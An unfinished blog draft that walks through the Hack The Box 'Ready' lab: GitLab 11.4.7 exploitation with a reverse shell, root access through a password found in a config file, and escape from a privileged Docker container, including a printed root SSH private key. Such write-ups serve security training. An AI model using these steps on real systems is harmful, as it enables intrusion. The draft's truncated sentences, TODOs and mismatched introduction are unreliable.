---
layout: post
title:  "Hack The Box - Ready - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Ready-Writeup" %}
<script>  </script>
# Introduction
The hack the box machine "Ready" is a medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of arbitrary file uploads, PHP comparisions

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.220`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 

![nmap](/assets/{{ imgDir }}/nmap.png)

![gitlab](/assets/{{ imgDir }}/gitlab.png)

![register](/assets/{{ imgDir }}/register.png)

Submitting the registration form logs us in automatically. 
Testing123!

Press the profile picture in the top-right corner

![dropdown](/assets/{{ imgDir }}/dropdown.png)

We press help in the dropdown

![help](/assets/{{ imgDir }}/help.png)

"update asap" interesting..

We see the version

11.4.7
We can use [searhcsploit](https://www.exploit-db.com/searchsploit) to search for exploits for this version of GitLab by executing `searchsploit gitlab 11.4.7`. As can be seen below, this results in two exploits. We copy the first one by executing `searchsploit -p 49334` followed by `cp /usr/share/exploitdb/exploits/ruby/webapps/49334.py .`

![searchsploit](/assets/{{ imgDir }}/searchsploit.png)

ruby/webapps/49334.py
At the top of the exploit code, we can see the argument parser. It tells us that all parameters are required.

![args](/assets/{{ imgDir }}/args.png)

TODO: Maybe mention the two CVE:s we are exploiting + explain them

`nc -lvnp 443` 

`python3 49334.py -u x -p Testing123! -g http://10.10.10.220 -l 10.10.16.2 -P 443`

![exploit](/assets/{{ imgDir }}/exploit.png)

![revShell](/assets/{{ imgDir }}/revShell.png)

We get a connection ang acquire a shell. We can confirm that the host has pytohn3 installed by executing `which python3`. Then, we can upgrade our shell by executing `python3 -c "import pty; pty.spawn('/bin/bash')"`.

# Privilege Escalation

TODO: How do we know that we are in docker?
In the `/opt` directory, it is possible to find a directory named `backup`. In the `backup` directory, we find a file named "docker-compose.yml" and a file named "gitlab.rb", as demonstrated below.
gitlab-secrets doesn't interest us.

{% highlight none linenos %}
git@gitlab:~/gitlab-rails/working$ @@ls -l /opt@@
ls -l /opt
total 12
drwxr-xr-x 2 root root 4096 Dec  7  2020 @@@backup@@@
drwxr-xr-x 1 root root 4096 Dec  1  2020 gitlab
git@gitlab:~/gitlab-rails/working$ @@ls -l /opt/backup@@
ls -l /opt/backup
total 100
-rw-r--r-- 1 root root   872 Dec  7  2020 @@@docker-compose.yml@@@
-rw-r--r-- 1 root root 15092 Dec  1  2020 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1  2020 @@@gitlab.rb@@@
git@gitlab:~/gitlab-rails/working$
{% endhighlight %}

Line 27 states that we are runinng in a privileged docker container

{% highlight yml linenos %}
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
{% endhighlight %}


{% highlight none linenos %}
git@gitlab:~/gitlab-rails/working$ @@cat /opt/backup/gitlab.rb | grep password@@
cat /opt/backup/gitlab.rb | grep password
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '@@@_the_password_of_the_bind_user@@@'
#     password: '@@@_the_password_of_the_bind_user@@@'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "@@@password@@@"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "@@@wW59U!ZKMbG9+*#h@@@"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = '@@@SQL_USER_PASSWORD_HASH@@@'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: @@@PASSWORD@@@
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: @@@MD5_PASSWORD_HASH@@@
# postgresql['pgbouncer_user_password'] = nil
git@gitlab:~/gitlab-rails/working$
{% endhighlight %}

We can try each passoword by executing `su root` and submitting the password. upon doing this, we discover that the password x actually works, as demonstrated below. The next step is to break out of the docker container which can be done since it is a privileged container.

{% highlight none linenos %}
git@gitlab:~/gitlab-rails/working$ @@su root@@
su root
Password: @@wW59U!ZKMbG9+*#h@@

@@@root@gitlab@@@:/var/opt/gitlab/gitlab-rails/working#
{% endhighlight %}

On misconfigured docker instances we can use the fdisk and mount(?) commands.

{% highlight none linenos %}
root@gitlab:/var/opt/gitlab/gitlab-rails/working# @@fdisk -l@@
[...]
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
@@@/dev/sda2@@@      4096 37746687 37742592  18G @@@Linux filesystem@@@
/dev/sda3  37746688 41940991  4194304   2G Linux swap
root@gitlab:/var/opt/gitlab/gitlab-rails/working# 
{% endhighlight %}

{% highlight none linenos %}
root@gitlab:/var/opt/gitlab/gitlab-rails/working# @@mkdir /mnt/realFileSystem@@
mkdir /mnt/realFileSystem
root@gitlab:/var/opt/gitlab/gitlab-rails/working# @@mount /dev/sda1 /mnt/realFileSystem@@
</gitlab-rails/working# mount /dev/sda1 /mnt/realFileSystem                  
mount: wrong fs type, bad option, bad superblock on /dev/sda1,
       missing codepage or helper program, or other error

       In some cases useful info is found in syslog - try
       dmesg | tail or so.
root@gitlab:/var/opt/gitlab/gitlab-rails/working# @@mount /dev/sda2 /mnt/realFileSystem@@
</gitlab-rails/working# mount /dev/sda2 /mnt/realFileSystem                  
root@gitlab:/var/opt/gitlab/gitlab-rails/working# @@ls /mnt/realFileSystem@@
ls /mnt/realFileSystem
@@@bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var@@@
{% endhighlight %}

{% highlight none linenos %}
root@gitlab:/var/opt/gitlab/gitlab-rails/working# cd /mnt/realFileSystem/root/.ssh
cd /mnt/realFileSystem/root/.ssh
root@gitlab:/mnt/realFileSystem/root/.ssh# ls -la 
ls -la
total 20
drwx------  2 root root 4096 Dec  7  2020 .
drwx------ 10 root root 4096 Dec  7  2020 ..
-rw-------  1 root root  405 Dec  7  2020 authorized_keys
-rw-------  1 root root 1675 Dec  7  2020 id_rsa
-rw-r--r--  1 root root  405 Dec  7  2020 id_rsa.pub
root@gitlab:/mnt/realFileSystem/root/.ssh# cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
root@gitlab:/mnt/realFileSystem/root/.ssh#
{% endhighlight %}
We select this and copy it from the terminal and save it in a file named id_rsa locally.


{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ chmod 600 id_rsa                                                                                                                                130 ⨯
                                                                                                                                                          
┌──(kali㉿kali)-[/tmp/x]
└─$ ssh -i id_rsa root@10.10.10.220
load pubkey "id_rsa": invalid format
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 09 Dec 2021 04:37:24 PM UTC

  System load:                      0.1
  Usage of /:                       65.4% of 17.59GB
  Memory usage:                     82%
  Swap usage:                       0%
  Processes:                        376
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:b27

  => There are 34 zombie processes.

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

186 updates can be installed immediately.
89 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
root@ready:~#
{% endhighlight %}

![root](/assets/{{ imgDir }}/root.png)

{% highlight none linenos %}
Placeholder
{% endhighlight %}

